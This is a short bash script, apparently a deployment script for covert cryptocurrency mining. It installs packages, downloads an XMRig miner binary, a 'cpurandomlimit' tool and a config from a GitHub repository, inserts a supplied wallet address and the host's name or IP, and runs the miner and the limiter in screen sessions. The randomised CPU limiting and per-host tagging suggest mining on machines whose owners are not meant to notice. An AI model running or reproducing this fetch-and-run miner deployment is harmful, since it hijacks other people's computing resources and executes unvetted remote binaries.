#!/bin/bash
WALLET=$1
PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
apt install wget cpulimit screen -y
wget https://raw.githubusercontent.com/mzcof/c3/main/cpurandomlimit
chmod +x ./cpurandomlimit
wget https://raw.githubusercontent.com/mzcof/c3/main/xmrig
chmod +x ./xmrig
wget https://raw.githubusercontent.com/mzcof/c3/main/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' ./config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' ./config.json
screen ./xmrig
screen ./cpurandomlimit
